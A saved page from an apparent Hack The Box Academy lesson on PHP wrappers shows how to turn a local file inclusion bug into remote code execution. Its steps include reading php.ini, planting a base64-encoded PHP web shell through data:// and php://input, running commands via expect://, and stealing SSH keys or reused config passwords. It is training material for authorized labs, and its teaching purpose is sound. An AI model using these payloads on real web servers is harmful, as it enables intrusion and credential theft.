@@ -1,0 +1,1519 @@
+<!DOCTYPE html>
+<!-- saved from url=(0052)https://academy.hackthebox.com/module/23/section/253 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>File Inclusion</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content="Premium Multipurpose Admin &amp; Dashboard Template" name="description">
+<meta content="Themesbrand" name="author">
+<link rel="shortcut icon" href="https://academy.hackthebox.com/images/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://academy.hackthebox.com/images/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://academy.hackthebox.com/images/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://academy.hackthebox.com/images/apple-touch-icon.png">
+<link rel="mask-icon" href="https://academy.hackthebox.com/images/safari-pinned-tab.svg">
+<link href="./File Inclusion5_files/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./File Inclusion5_files/icons.css" rel="stylesheet" type="text/css">
+<link href="./File Inclusion5_files/app-dark.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./File Inclusion5_files/prism.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./File Inclusion5_files/toastr.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./File Inclusion5_files/ryt3opf.css">
+<script type="text/javascript" async="" src="./File Inclusion5_files/awwxrc0h"></script><script type="text/javascript" async="" src="./File Inclusion5_files/uwt.js.download"></script><script type="text/javascript" async="" src="./File Inclusion5_files/insight.min.js.download"></script><script src="./File Inclusion5_files/346791856678772" async=""></script><script type="text/javascript" async="" src="./File Inclusion5_files/fbevents.js.download"></script><script type="text/javascript" async="" src="./File Inclusion5_files/analytics.js.download"></script><script type="text/javascript" src="./File Inclusion5_files/commons.54701049fd6fb8497e9e.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./File Inclusion5_files/intercom.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./File Inclusion5_files/twitter-ads.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./File Inclusion5_files/linkedin-insight-tag.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./File Inclusion5_files/facebook-pixel.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./File Inclusion5_files/google-analytics.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" async="" src="./File Inclusion5_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-TE9Ls1LqNaomGaFdDlxBJIkg+bFnKWbASEx9XrnnCV1SiORfW/qiKK2lsAbkVeBa"></script><script type="text/javascript" async="" src="./File Inclusion5_files/analytics.min.js.download"></script><script>
+        !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
+                analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
+                                                        properties = {"platform":"Academy","platform_version":"V1","module_id":23,"module_name":"File Inclusion","module_difficulty":"Medium","section_id":253,"section_title":"PHP Wrappers"};
+                                                analytics.page(
+                    "Module",
+                    properties
+                );
+                                            }
+        }();
+    </script>
+<style>
+    .website-screenshot-url {
+        height: 22px;
+        cursor: text;
+        padding-left: 10px;
+    }
+</style>
+<script src="./File Inclusion5_files/api.js.download"></script>
+</head>
+<body data-layout="detached" data-topbar="colored">
+<div class="container-fluid">
+<div id="layout-wrapper">
+<header id="page-topbar">
+<div class="navbar-header">
+<div class="container-fluid">
+<div class="float-right">
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<a href="https://academy.hackthebox.com/billing">
+<button type="button" class="btn btn-extra-light">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;Purchase Cubes
+</button>
+</a>
+</div>
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
+<i class="mdi mdi-fullscreen"></i>
+</button>
+</div>
+<div class="dropdown d-inline-block">
+<button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<img class="rounded-circle header-profile-user" src="./File Inclusion5_files/1782606024b767354a8c9d75e1a6323a" alt="Header Avatar">
+<span class="d-none d-xl-inline-block ml-1">Tommy034</span>
+<i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
+</button>
+<div class="dropdown-menu dropdown-menu-right">
+<a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> Vpn Settings</a>
+<div class="dropdown-divider"></div>
+<form method="POST" action="https://academy.hackthebox.com/logout"> <input type="hidden" name="_token" value="OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E"> <a onclick="$(this).closest(&#39;form&#39;).submit()" class="dropdown-item text-danger" href="https://academy.hackthebox.com/module/23/section/253#"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
+</form>
+</div>
+</div>
+</div>
+<div class="d-flex align-items-center">
+<div class="navbar-brand-box">
+<a href="https://academy.hackthebox.com/dashboard" class="logo">
+<span class="logo-sm">
+<img src="./File Inclusion5_files/logo.svg" alt="" height="30">
+</span>
+<span class="logo-lg">
+<img src="./File Inclusion5_files/logo.svg" alt="" height="36">
+</span>
+</a>
+</div>
+<button type="button" class="btn btn-sm px-3 font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn">
+<i class="fa fa-fw fa-bars"></i>
+</button>
+<div class="topnav">
+<nav class="navbar navbar-light navbar-expand-lg topnav-menu">
+<div class="collapse navbar-collapse" id="topnav-menu-content">
+<ul class="navbar-nav active">
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
+Modules</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
+</li>
+</ul>
+</div>
+</nav>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class="main-content">
+<div class="page-content">
+<div class="row">
+<div class="col-12">
+<div class="page-title-box d-flex align-items-center justify-content-between">
+<h4 class="page-title mb-0 font-size-18 letter-spacing-1">File Inclusion &nbsp;<i style="cursor:pointer;" data-module-id="23" data-toggle="tooltip" data-title="Toggle To-Do" class="favouriteBtn  fa  fa-heart text-danger" data-original-title="" title=""></i></h4>
+<div class="page-title-right">
+<ol class="breadcrumb m-0">
+<li class="breadcrumb-item"><a href="javascript: void(0);">Page 5</a></li>
+<li class="breadcrumb-item active">PHP Wrappers</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="row justify-content-xl-center">
+<div class="col-md-12 col-xl-9 col-xxl-7">
+<div class="training-module">
+<h1>PHP Wrappers</h1>
+<p>So far in this module, we have been exploiting file inclusion vulnerabilities to disclose local files through various methods. From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.</p>
+<p>We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like <code>config.php</code>, which may match a user's password in case they re-use the same password. Or we can check the <code>.ssh</code> directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (<code>id_rsa</code>) and use it to SSH into the system.</p>
+<p>Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different <code>PHP Wrappers</code> to gain remote code execution. Then, in the upcoming sections, we will learn other methods to gain remote code execution that can be used with PHP and other languages as well.</p>
+<hr>
+<h2>Data</h2>
+<p>The <a href="https://www.php.net/manual/en/wrappers.data.php" target="_blank" rel="noopener nofollow">data</a> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (<code>allow_url_include</code>) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.</p>
+<h4>Checking PHP Configurations</h4>
+<p>To do so, we can include the PHP configuration file found at (<code>/etc/php/X.Y/apache2/php.ini</code>) for Apache or at (<code>/etc/php/X.Y/fpm/php.ini</code>) for Nginx, where <code>X.Y</code> is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the <code>base64</code> filter we used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Checking PHP Configurations</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> <span class="token string">"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"</span></span></span>
+<span class="token output">&lt;!DOCTYPE html&gt;
+
+&lt;html lang="en"&gt;
+...SNIP...
+ &lt;h2&gt;Containers&lt;/h2&gt;
+    W1BIUF0KCjs7Ozs7Ozs7O
+    ...SNIP...
+    4KO2ZmaS5wcmVsb2FkPQo=
+&lt;p class="read-more"&gt;
+</span></code></pre></div></div>
+<p>Once we have the base64 encoded string, we can decode it and <code>grep</code> for <code>allow_url_include</code> to see its value:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Checking PHP Configurations</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo='</span> <span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">grep</span> allow_url_include</span></span>
+
+<span class="token output">allow_url_include = On
+</span></code></pre></div></div>
+<p>Excellent! We see that we have this option enabled, so we can use the <code>data</code> wrapper. Knowing how to check for the <code>allow_url_include</code> option can be very important, as <code>this option is not enabled by default</code>, and is required for several other LFI attacks, like using the <code>input</code> wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.</p>
+<h4>Remote Code Execution</h4>
+<p>With <code>allow_url_include</code> enabled, we can proceed with our <code>data</code> wrapper attack. As mentioned earlier, the <code>data</code> wrapper can be used to include external data, including PHP code. We can also pass it <code>base64</code> encoded strings with <code>text/plain;base64</code>, and it has the ability to decode them and execute the PHP code.</p>
+<p>So, our first step would be to base64 encode a basic PHP web shell, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Remote Code Execution</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'&lt;?php system(<span class="token variable">$_GET</span>["cmd"]); ?&gt;'</span> <span class="token operator">|</span> base64</span></span>
+
+<span class="token output">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+</span></code></pre></div></div>
+<p>Now, we can URL encode the base64 string, and then pass it to the data wrapper with <code>data://text/plain;base64,</code>. Finally, we can use pass commands to the web shell with <code>&amp;cmd=&lt;COMMAND&gt;</code>:
+<div class="window_container"><div class="window_content">
+                    <div class="window_top">
+                        <span class="mr-2">
+                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
+                        </span>
+                        <input type="text" class="website-screenshot-url" disabled="" value="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id">
+                        <span class="float-right"><i class="fa fa-bars"></i></span>
+                    </div>
+                <img class="website-screenshot" data-url="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id" src="./File Inclusion5_files/data_wrapper_id.png" style="border: 0px; border-radius: 0px;"></div></div></p>
+<p>We may also use cURL for the same attack, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Remote Code Execution</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -s <span class="token string">'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id'</span> <span class="token operator">|</span> <span class="token function">grep</span> uid</span></span>
+<span class="token output">            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<hr>
+<h2>Input</h2>
+<p>Similar to the <code>data</code> wrapper, the <a href="https://www.php.net/manual/en/wrappers.php.php" target="_blank" rel="noopener nofollow">input</a> wrapper can be used to include external input and execute PHP code. The difference between it and the <code>data</code> wrapper is that we pass our input to the <code>input</code> wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the <code>input</code> wrapper also depends on the <code>allow_url_include</code> setting, as mentioned earlier.</p>
+<p>To repeat our earlier attack but with the <code>input</code> wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Remote Code Execution</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -s -X POST --data <span class="token string">'&lt;?php system(<span class="token variable">$_GET</span>["cmd"]); ?&gt;'</span> <span class="token string">"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</span> <span class="token operator">|</span> <span class="token function">grep</span> uid</span></span>
+<span class="token output">            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<div class="card bg-light">
+<div class="card-body">
+<p class="mb-0"><b>Note:</b> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use <code>$_REQUEST</code>). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <code>&lt;\?php system('id')?&gt;</code>)</p>
+</div>
+</div>
+<hr>
+<h2>Expect</h2>
+<p>Finally, we may utilize the <a href="https://www.php.net/manual/en/wrappers.expect.php" target="_blank" rel="noopener nofollow">expect</a> wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.</p>
+<p>However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with <code>allow_url_include</code> earlier, but we'd <code>grep</code> for <code>expect</code> instead, and if it is installed and enabled we'd get the following:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Remote Code Execution</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo='</span> <span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">expect</span></span></span>
+<span class="token output">extension=expect
+</span></code></pre></div></div>
+<p>As we can see, the <code>extension</code> configuration keyword is used to enable the <code>expect</code> module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the <code>expect://</code> wrapper and then pass the command we want to execute, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Remote Code Execution</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -s <span class="token string">"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</span></span></span>
+<span class="token output">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>As we can see, executing commands through the <code>expect</code> module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The <a href="https://academy.hackthebox.com/module/details/134" target="_blank" rel="noopener nofollow">Web Attacks</a> module also covers using the <code>expect</code> module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.</p>
+<p>These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the <code>phar</code> and <code>zip</code> wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.</p>
+<div id="screen" style="height: 600px; border: 1px solid;">
+<div class="screenPlaceholder">
+<div class="instanceLoading" style="display: none;">
+<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
+<div class="text-center">Instance is starting...</div>
+</div>
+<div class="instanceTerminating" style="display: none;">
+<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
+<div class="text-center">Terminating instance...</div>
+</div>
+<div class="row instanceStart max-width-canvas">
+<div class="col-4"></div>
+<div class="col-4">
+<button class=" startInstanceBtn btn btn-primary btn-lg btn-block" style="margin-top: 270px;">Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<div class="col-4"></div>
+</div>
+</div>
+</div>
+<div class="row align-center justify-center my-4">
+<div class="col-5 justify-start">
+<button style="display:none;" target="_blank" class="instance-button fullScreenBtn btn btn-light btn-sm float-left "><i class="fad fa-expand text-success mr-1"></i> &nbsp;Full Screen</button>
+ <button style="display:none;" class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1"><i class="fad fa-sync text-warning mr-2"></i> &nbsp;Reset</button>
+<div class="btn-group " role="group">
+<button style="display:none;cursor: default;" class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm " data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+<div id="statusText" class="col-7 justify-end pt-2 pr-2 font-size-small text-right">Waiting to start...</div>
+</div>
+<div class="card" id="questionsDiv">
+<div class="card-body">
+<div class="row">
+<div class="col-9">
+<h4 class="card-title mt-0 font-size-medium">Questions</h4>
+<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below to complete this Section and earn cubes!</p>
+<p class="card-title-desc font-size-large font-size-15">
+Target: <span class="text-success"><span class="target" style="cursor:pointer;"><span class="spawnTargetBtn">Click here to spawn the target system!</span></span></span>
+<button class="resetTargetBtn btn btn-light btn-sm " data-toggle="tooltip" data-title="Reset Target" style="cursor: pointer; display: none;" data-original-title="" title=""><i class="fad fa-sync text-warning"></i></button>
+<br>
+<span class="targetLifeTimeContainer" style="display: none;">Time Left: <span class="targetLifeTime  font-size-15">0</span> minutes</span>
+</p>
+</div>
+<div class="col-3 text-right float-right">
+<button class="btn btn-light bg-color-blue-nav mt-2" data-toggle="modal" data-target="#cheatSheetModal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
+</div>
+</div>
+<div>
+<div>
+<label class="module-question" for="91"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Try to gain RCE using one of the PHP wrappers and read the flag at /</label>
+<div class="row">
+<div class=" col-lg-8  mb-4">
+<input class="form-control bg-color-blue-nav" id="answer91" type="text" color="green" placeholder="Submit your answer here..." maxlength="191">
+</div>
+<div class="col-lg-2 mb-4">
+<button class="btn btn-primary btn-block btnAnswer" id="btnAnswer91" data-question-id="91"><i class="fad fa-flag-checkered mr-2"></i> Submit</button>
+</div>
+<div class="col-lg-2 mb-4">
+</div>
+</div>
+<div class=""></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="card bg-color-blue-nav" style="margin: 30px 0">
+<div class="card-body">
+<a href="https://academy.hackthebox.com/module/23/section/1492" class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
+<form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
+<input type="hidden" name="module_id" value="23">
+<input type="hidden" name="page_id" value="6">
+<input type="hidden" name="completed" value="1">
+<button id="completeBtn" class="btn btn-outline-success" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete &amp; Next</button>
+</form>
+<a href="https://academy.hackthebox.com/module/23/section/254" class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
+</div>
+</div>
+</div>
+<div class="col-md-12 col-xl-3 col-xxl-3">
+<div id="table-of-contents">
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<button class="btn btn-light btn-block module-button" data-toggle="modal" data-target="#cheatSheetModal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
+<a href="https://academy.hackthebox.com/module/23/section/253#questionsDiv" class="btn btn-light btn-block module-button"><i class="fad fa-question mr-2"></i> Go to Questions</a>
+</div>
+</div>
+<div class="card" id="TOC">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
+<h6 class="mt-4 mb-2">Introduction</h6> <a href="https://academy.hackthebox.com/module/23/section/250" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Intro to File Inclusions</span>
+</a>
+<h6 class="mt-4 mb-2">File Disclosure</h6> <a href="https://academy.hackthebox.com/module/23/section/251" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Local File Inclusion (LFI)</span>
+</a>
+<a href="https://academy.hackthebox.com/module/23/section/1491" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+ <span class="font-size-13">Basic Bypasses</span>
+</a>
+<a href="https://academy.hackthebox.com/module/23/section/1492" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">PHP Filters</span>
+</a>
+<h6 class="mt-4 mb-2">Remote Code Execution</h6> <a href="https://academy.hackthebox.com/module/23/section/253" class="btn   text-primary  btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">PHP Wrappers</span>
+</a>
+<a href="https://academy.hackthebox.com/module/23/section/254" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Remote File Inclusion (RFI)</span>
+</a>
+<a href="https://academy.hackthebox.com/module/23/section/1493" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">LFI and File Uploads</span>
+</a>
+<a href="https://academy.hackthebox.com/module/23/section/252" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Log Poisoning</span>
+</a>
+<h6 class="mt-4 mb-2">Automation and Prevention</h6> <a href="https://academy.hackthebox.com/module/23/section/1494" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Automated Scanning</span>
+</a>
+<a href="https://academy.hackthebox.com/module/23/section/622" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">File Inclusion Prevention</span>
+</a>
+<h6 class="mt-4 mb-2">Skills Assessment</h6> <a href="https://academy.hackthebox.com/module/23/section/513" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Skills Assessment - File Inclusion</span>
+</a>
+</div>
+</div>
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title mb-4">My Workstation</h5>
+<div class="row">
+<div class="col-12">
+<div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
+<div class="screenPlaceholder">
+<p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">OFFLINE</p>
+<p class="instanceLoading " style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
+</div>
+</div>
+</div>
+<div class="col-12 mt-2">
+<div class="instanceStart">
+<button class=" startInstanceBtn btn btn-light btn-sm mt-2 btn-block module-button py-2"><i class="fad fa-play-circle text-success"></i> &nbsp;Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<button style="display:none;" class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-expand text-success"></i> &nbsp;Interact</button>
+<button style="display:none;" class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-sync text-warning"></i> &nbsp;Reset</button>
+<div class="btn-group" role="group">
+<button style="display:none; cursor: default;" class=" extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+</div>
+</div>
